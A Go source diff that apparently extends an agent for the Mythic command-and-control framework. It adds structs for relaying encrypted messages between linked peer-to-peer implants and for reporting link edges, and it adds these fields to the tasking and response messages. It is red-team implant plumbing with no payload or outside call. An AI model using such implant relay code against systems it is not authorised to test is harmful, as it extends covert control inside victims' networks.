@@ -348,6 +348,24 @@ type CommandResult struct {
 	Completed bool
 }
 
+// DelegateMessage wraps a message to/from a linked P2P agent.
+// When sending to Mythic: Message is the base64-encoded encrypted data from the child.
+// When receiving from Mythic: Message is the base64-encoded encrypted data for the child.
+type DelegateMessage struct {
+	Message       string `json:"message"`        // Base64-encoded encrypted message
+	UUID          string `json:"uuid"`            // Target agent UUID (or temp UUID during staging)
+	C2ProfileName string `json:"c2_profile"`      // C2 profile name (e.g., "tcp")
+	MythicUUID    string `json:"new_uuid,omitempty"` // Corrected UUID from Mythic after staging
+}
+
+// P2PConnectionMessage notifies Mythic about P2P link state changes (edges in the graph).
+type P2PConnectionMessage struct {
+	Source        string `json:"source"`         // Source callback UUID
+	Destination   string `json:"destination"`    // Destination callback UUID
+	Action        string `json:"action"`         // "add" or "remove"
+	C2ProfileName string `json:"c2_profile"`     // "tcp"
+}
+
 // CheckinMessage represents the initial checkin message
 type CheckinMessage struct {
 	Action       string   `json:"action"`
@@ -366,9 +384,10 @@ type CheckinMessage struct {
 
 // TaskingMessage represents the message to get tasking
 type TaskingMessage struct {
-	Action      string     `json:"action"`
-	TaskingSize int        `json:"tasking_size"`
-	Socks       []SocksMsg `json:"socks,omitempty"`
+	Action      string             `json:"action"`
+	TaskingSize int                `json:"tasking_size"`
+	Socks       []SocksMsg         `json:"socks,omitempty"`
+	Delegates   []DelegateMessage  `json:"delegates,omitempty"`
 	// Add agent identification for checkin updates
 	PayloadUUID string `json:"uuid,omitempty"`
 	PayloadType string `json:"payload_type,omitempty"`
@@ -377,9 +396,11 @@ type TaskingMessage struct {
 
 // PostResponseMessage represents posting a response back to Mythic
 type PostResponseMessage struct {
-	Action    string     `json:"action"`
-	Responses []Response `json:"responses"`
-	Socks     []SocksMsg `json:"socks,omitempty"`
+	Action    string                 `json:"action"`
+	Responses []Response             `json:"responses"`
+	Socks     []SocksMsg             `json:"socks,omitempty"`
+	Delegates []DelegateMessage      `json:"delegates,omitempty"`
+	Edges     []P2PConnectionMessage `json:"edges,omitempty"`
 }
 
 // Command interface for all commands
